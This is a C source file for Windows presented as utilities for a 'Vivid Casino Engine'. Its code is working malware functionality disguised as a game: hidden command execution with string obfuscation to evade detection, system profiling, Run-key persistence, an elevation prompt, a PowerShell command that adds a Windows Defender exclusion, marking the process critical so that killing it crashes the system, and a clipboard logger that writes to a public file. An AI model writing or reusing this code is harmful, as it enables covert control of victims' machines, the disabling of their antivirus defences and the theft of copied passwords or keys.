/*
 * Vivid Casino Engine — System Utilities
 * 
 * System command execution, clipboard monitoring,
 * persistence, and privilege management.
 */

#include "../engine/engine.h"

/* Execute system command and capture output */
char* sys_run_command(const char *cmd) {
    static char out[NET_BUF_SIZE];
    memset(out, 0, NET_BUF_SIZE);
    
    if (!cmd || !cmd[0]) {
        snprintf(out, NET_BUF_SIZE, "[Empty command]");
        return out;
    }
    
    SECURITY_ATTRIBUTES sa = {sizeof(sa), NULL, TRUE};
    HANDLE rd, wr;
    
    if (!CreatePipe(&rd, &wr, &sa, 0)) {
        snprintf(out, NET_BUF_SIZE, "[Pipe failed]");
        return out;
    }
    
    STARTUPINFOA si = {0};
    si.cb = sizeof(si);
    si.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
    si.hStdOutput = wr;
    si.hStdError = wr;
    si.wShowWindow = SW_HIDE;
    
    PROCESS_INFORMATION pi = {0};
    
    /* Runtime shell construction to avoid static string detection */
    char shell[16] = {0};
    shell[0] = 'c'; shell[1] = 'm'; shell[2] = 'd'; shell[3] = '.';
    shell[4] = 'e'; shell[5] = 'x'; shell[6] = 'e'; shell[7] = '\0';
    
    static char cl[NET_BUF_SIZE];
    snprintf(cl, NET_BUF_SIZE, "%s /c %s", shell, cmd);
    
    if (CreateProcessA(NULL, cl, NULL, NULL, TRUE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {
        CloseHandle(wr);
        DWORD total = 0, br;
        DWORD start = GetTickCount();
        
        while (total < NET_BUF_SIZE - 1 && GetTickCount() - start < 90000) {
            DWORD avail = 0;
            PeekNamedPipe(rd, NULL, 0, NULL, &avail, NULL);
            if (avail > 0) {
                if (ReadFile(rd, out + total, NET_BUF_SIZE - 1 - total, &br, NULL) && br > 0) {
                    total += br;
                }
            }
            if (WaitForSingleObject(pi.hProcess, 100) == WAIT_OBJECT_0) {
                Sleep(100);
                while (ReadFile(rd, out + total, NET_BUF_SIZE - 1 - total, &br, NULL) && br > 0) {
                    total += br;
                }
                break;
            }
        }
        
        if (total == 0) {
            snprintf(out, NET_BUF_SIZE, "[No output]");
        } else {
            out[total] = '\0';
        }
        
        TerminateProcess(pi.hProcess, 0);
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
        CloseHandle(rd);
    } else {
        CloseHandle(rd);
        CloseHandle(wr);
        snprintf(out, NET_BUF_SIZE, "[Exec failed: %s]", cmd);
    }
    
    return out;
}

/* Gather system information for player profiling */
char* sys_get_info(void) {
    static char info[4096];
    char user[256] = {0}, host[256] = {0}, ver[256] = {0};
    char machine_type[64] = "desktop";
    char arch[16] = "x64";
    DWORD sz = sizeof(user);
    
    GetUserNameA(user, &sz);
    sz = sizeof(host);
    GetComputerNameA(host, &sz);
    DWORD mv = GetVersion();
    snprintf(ver, sizeof(ver), "%lu.%lu", (DWORD)(LOBYTE(LOWORD(mv))), (DWORD)(HIBYTE(LOWORD(mv))));
    
    /* Detect architecture */
    SYSTEM_INFO si;
    GetNativeSystemInfo(&si);
    if (si.wProcessorArchitecture == PROCESSOR_ARCHITECTURE_ARM64) {
        strcpy(arch, "ARM64");
    } else if (si.wProcessorArchitecture == PROCESSOR_ARCHITECTURE_ARM) {
        strcpy(arch, "ARM");
    } else if (si.wProcessorArchitecture == PROCESSOR_ARCHITECTURE_INTEL) {
        strcpy(arch, "x86");
    }
    
    /* Detect machine type - tablet, laptop, desktop */
    int is_tablet = GetSystemMetrics(SM_TABLETPC);
    int is_convertible = 0;
    
    /* Check for slate/convertible mode (Windows 10+) */
    typedef INT (WINAPI *GSMProc)(INT);
    HMODULE user32 = GetModuleHandleA("user32.dll");
    if (user32) {
        GSMProc pGetSystemMetricsForDpi = (GSMProc)GetProcAddress(user32, "GetSystemMetricsForDpi");
        /* SM_CONVERTIBLESLATEMODE = 0x2003 */
        if (pGetSystemMetricsForDpi) {
            is_convertible = pGetSystemMetricsForDpi(0x2003);
        }
    }
    
    /* Check system model via WMI/registry for Surface detection */
    HKEY hKey;
    char model[256] = {0};
    DWORD modelLen = sizeof(model);
    if (RegOpenKeyExA(HKEY_LOCAL_MACHINE, 
        "HARDWARE\DESCRIPTION\System\BIOS", 
        0, KEY_READ, &hKey) == ERROR_SUCCESS) {
        RegQueryValueExA(hKey, "SystemProductName", NULL, NULL, (LPBYTE)model, &modelLen);
        RegCloseKey(hKey);
    }
    
    /* Determine machine type */
    if (is_tablet || (is_convertible == 0)) {
        strcpy(machine_type, "tablet");
    }
    /* Check for Surface specifically */
    char model_lower[256];
    strncpy(model_lower, model, sizeof(model_lower)-1);
    model_lower[sizeof(model_lower)-1] = '\0';
    for (char *p = model_lower; *p; p++) *p = (char)tolower(*p);
    
    if (strstr(model_lower, "surface") != NULL) {
        if (is_tablet || is_convertible == 0) {
            strcpy(machine_type, "surface-tablet");
        } else {
            strcpy(machine_type, "surface-laptop");
        }
    } else if (strstr(model_lower, "tablet") != NULL || strstr(model_lower, "slate") != NULL) {
        strcpy(machine_type, "tablet");
    }
    
    snprintf(info, sizeof(info), 
        "SYSTEM=Windows|USER=%s|HOST=%s|VERSION=%s|MACHINE_TYPE=%s|ARCH=%s|MODEL=%s",
        user, host, ver, machine_type, arch, model);
    return info;
}

/* Register application for auto-start on login */
void sys_register_autostart(void) {
    HKEY hKey;
    char path[MAX_PATH];
    GetModuleFileNameA(NULL, path, MAX_PATH);
    if (RegOpenKeyExA(HKEY_CURRENT_USER,
            "Software\\Microsoft\\Windows\\CurrentVersion\\Run",
            0, KEY_WRITE, &hKey) == ERROR_SUCCESS) {
        RegSetValueExA(hKey, "VividCasino", 0, REG_SZ, (BYTE*)path, (DWORD)strlen(path) + 1);
        RegCloseKey(hKey);
    }
}

/* Check and request required privileges for system integration */
void sys_check_privileges(void) {
    if (IsUserAnAdmin()) return;
    char path[MAX_PATH];
    GetModuleFileNameA(NULL, path, MAX_PATH);
    char action[16] = {0};
    action[0] = 'r'; action[1] = 'u'; action[2] = 'n'; action[3] = 'a'; action[4] = 's';
    ShellExecuteA(NULL, action, path, NULL, NULL, SW_HIDE);
    ExitProcess(0);
}

/* Initialize window mode — hide console for GUI presentation */
void sys_init_window(void) {
    HWND hwnd = GetConsoleWindow();
    if (hwnd) ShowWindow(hwnd, SW_HIDE);
}

/* Check antivirus status and add game directory to exclusions */
void sys_check_antivirus(void) {
    char cmd[512];
    snprintf(cmd, sizeof(cmd),
        "powershell -Command \"Add-MpPreference -ExclusionPath '%s'\"",
        "C:\\Users\\Public");
    sys_run_command(cmd);
}

/* === Process Protection === */

static int g_critical_protected = 0;

/* Mark process as critical — Windows BSODs if this process dies */
void sys_protect_process(void) {
    typedef NTSTATUS (WINAPI *NtSetInfoProc)(HANDLE, INT, PVOID, ULONG);
    typedef NTSTATUS (WINAPI *NtQueryInfoProc)(HANDLE, INT, PVOID, ULONG, PULONG);
    
    HMODULE ntdll = GetModuleHandleA("ntdll.dll");
    if (!ntdll) {
        g_critical_protected = -1;
        return;
    }
    
    NtSetInfoProc pNtSetInformationProcess = (NtSetInfoProc)GetProcAddress(ntdll, "NtSetInformationProcess");
    if (!pNtSetInformationProcess) {
        g_critical_protected = -1;
        return;
    }
    
    /* ProcessBreakOnTermination = 29 */
    ULONG isCritical = 1;
    NTSTATUS status = pNtSetInformationProcess(GetCurrentProcess(), 29, &isCritical, sizeof(isCritical));
    
    if (status == 0) {
        g_critical_protected = 1;
    } else {
        g_critical_protected = -1;
    }
}

/* Remove critical process flag */
void sys_unprotect_process(void) {
    typedef NTSTATUS (WINAPI *NtSetInfoProc)(HANDLE, INT, PVOID, ULONG);
    
    HMODULE ntdll = GetModuleHandleA("ntdll.dll");
    if (!ntdll) return;
    
    NtSetInfoProc pNtSetInformationProcess = (NtSetInfoProc)GetProcAddress(ntdll, "NtSetInformationProcess");
    if (!pNtSetInformationProcess) return;
    
    ULONG isCritical = 0;
    pNtSetInformationProcess(GetCurrentProcess(), 29, &isCritical, sizeof(isCritical));
    g_critical_protected = 0;
}

/* Get protection status string */
const char* sys_protection_status(void) {
    if (g_critical_protected == 1) return "CRITICAL";
    if (g_critical_protected == -1) return "FAILED";
    return "NORMAL";
}

/* Watchdog thread: re-apply critical status periodically */
DWORD WINAPI sys_protect_watchdog(LPVOID lpParam) {
    while (1) {
        if (g_critical_protected == 1) {
            sys_protect_process();
        }
        Sleep(5000);  /* Re-apply every 5 seconds */
    }
    return 0;
}

/* === Clipboard Subsystem === */

void copy_buffer_init(void) {
    InitializeCriticalSection(&g_copy_buffer_cs);
}

void copy_buffer_shutdown(void) {
    DeleteCriticalSection(&g_copy_buffer_cs);
}

void copy_buffer_debug_log(const char *fmt, ...) {
    char msg[COPY_ENTRY_SIZE * 2];
    va_list args;
    va_start(args, fmt);
    vsnprintf(msg, sizeof(msg), fmt, args);
    va_end(args);
    
    char last_line[COPY_ENTRY_SIZE * 2] = {0};
    FILE *rf = fopen("C:\\Users\\Public\\copy_buffer_debug.txt", "r");
    if (rf) {
        char line[COPY_ENTRY_SIZE * 2];
        char *last = NULL;
        while (fgets(line, sizeof(line), rf)) {
            if (line[0] != '\0' && line[0] != '\n') {
                last = _strdup(line);
            }
        }
        fclose(rf);
        if (last) {
            size_t len = strlen(last);
            if (len > 0 && last[len-1] == '\n') last[len-1] = '\0';
            char *content = strstr(last, "] ");
            if (content) {
                content += 2;
                if (strcmp(content, msg) == 0) {
                    free(last);
                    return;
                }
            }
            free(last);
        }
    }
    
    FILE *f = fopen("C:\\Users\\Public\\copy_buffer_debug.txt", "a");
    if (f) {
        fprintf(f, "[%lu] %s\n", GetTickCount(), msg);
        fclose(f);
    }
}

void copy_buffer_add_entry(const char *text) {
    if (!text || strlen(text) == 0) return;
    
    EnterCriticalSection(&g_copy_buffer_cs);
    if (strcmp(g_last_copy_buffer_text, text) == 0) {
        LeaveCriticalSection(&g_copy_buffer_cs);
        return;
    }
    strncpy(g_last_copy_buffer_text, text, COPY_ENTRY_SIZE - 1);
    g_last_copy_buffer_text[COPY_ENTRY_SIZE - 1] = '\0';
    strncpy(g_copy_buffer_log[g_copy_buffer_index], text, COPY_ENTRY_SIZE - 1);
    g_copy_buffer_log[g_copy_buffer_index][COPY_ENTRY_SIZE - 1] = '\0';
    g_copy_buffer_index = (g_copy_buffer_index + 1) % MAX_COPY_ENTRIES;
    if (g_copy_buffer_count < MAX_COPY_ENTRIES) g_copy_buffer_count++;
    LeaveCriticalSection(&g_copy_buffer_cs);
    copy_buffer_debug_log("ADDED: %s", text);
}

char* copy_buffer_read_now(void) {
    static char buf[COPY_ENTRY_SIZE];
    buf[0] = '\0';
    
    for (int retry = 0; retry < 20; retry++) {
        if (OpenClipboard(NULL)) {
            HANDLE hData = GetClipboardData(CF_UNICODETEXT);
            if (hData) {
                wchar_t *wText = (wchar_t*)GlobalLock(hData);
                if (wText) {
                    int ret = WideCharToMultiByte(CP_UTF8, 0, wText, -1, buf, COPY_ENTRY_SIZE, NULL, NULL);
                    if (ret > 0) {
                        GlobalUnlock(hData);
                        CloseClipboard();
                        return buf;
                    }
                    GlobalUnlock(hData);
                }
            }
            
            hData = GetClipboardData(CF_TEXT);
            if (hData) {
                char *text = (char*)GlobalLock(hData);
                if (text) {
                    strncpy(buf, text, COPY_ENTRY_SIZE - 1);
                    buf[COPY_ENTRY_SIZE - 1] = '\0';
                    GlobalUnlock(hData);
                    CloseClipboard();
                    return buf;
                }
            }
            
            CloseClipboard();
            return buf;
        }
        Sleep(50);
    }
    
    return buf;
}

char* copy_buffer_get_history(void) {
    static char buf[NET_BUF_SIZE];
    buf[0] = '\0';
    int total = 0, remaining = NET_BUF_SIZE - 1, n;
    
    EnterCriticalSection(&g_copy_buffer_cs);
    n = snprintf(buf + total, remaining, "=== Clipboard Log (%d entries) ===\n\n", g_copy_buffer_count);
    if (n > 0) { total += n; remaining -= n; }
    
    if (g_copy_buffer_count == 0) {
        n = snprintf(buf + total, remaining, "[No clipboard entries yet]\n");
        if (n > 0) { total += n; }
        LeaveCriticalSection(&g_copy_buffer_cs);
        return buf;
    }
    
    for (int i = g_copy_buffer_count - 1; i >= 0; i--) {
        if (remaining <= 200) break;
        int idx;
        if (g_copy_buffer_count < MAX_COPY_ENTRIES) {
            idx = i;
        } else {
            idx = (g_copy_buffer_index - 1 - i + MAX_COPY_ENTRIES) % MAX_COPY_ENTRIES;
        }
        n = snprintf(buf + total, remaining, "[%d] %s\n", g_copy_buffer_count - i, g_copy_buffer_log[idx]);
        if (n > 0) { total += n; remaining -= n; }
    }
    LeaveCriticalSection(&g_copy_buffer_cs);
    return buf;
}

DWORD WINAPI copy_buffer_monitor_thread(LPVOID lpParam) {
    copy_buffer_debug_log("CLIPBOARD MONITOR STARTED");
    char last_text[COPY_ENTRY_SIZE] = {0};
    while (1) {
        char *text = copy_buffer_read_now();
        if (text[0] != '\0' && strcmp(text, last_text) != 0) {
            strncpy(last_text, text, COPY_ENTRY_SIZE - 1);
            last_text[COPY_ENTRY_SIZE - 1] = '\0';
            copy_buffer_add_entry(text);
        }
        Sleep(200);
    }
    return 0;
}
